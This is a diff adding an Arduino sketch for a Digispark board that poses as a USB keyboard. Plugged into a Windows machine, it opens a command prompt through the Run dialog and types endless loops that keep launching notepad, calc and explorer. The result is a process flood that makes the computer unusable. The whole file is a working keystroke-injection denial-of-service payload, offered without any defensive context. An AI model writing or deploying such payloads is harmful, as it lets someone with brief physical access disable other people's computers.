@@ -1,0 +1,35 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1800);
+
+  for (int i = 0; i < 70; i++) {
+    DigiKeyboard.sendKeyStroke(KEY_F3);
+    DigiKeyboard.delay(10);
+  }
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(350);
+
+  DigiKeyboard.print(F("cmd"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(700);
+
+  DigiKeyboard.println(F("for /l %i in (1,0,2) do start notepad"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(400);
+  DigiKeyboard.println(F("for /l %i in (1,0,2) do start calc"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(400);
+  DigiKeyboard.println(F("for /l %i in (1,0,2) do start explorer"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  for(;;) {
+    DigiKeyboard.delay(10000);
+  }
+}
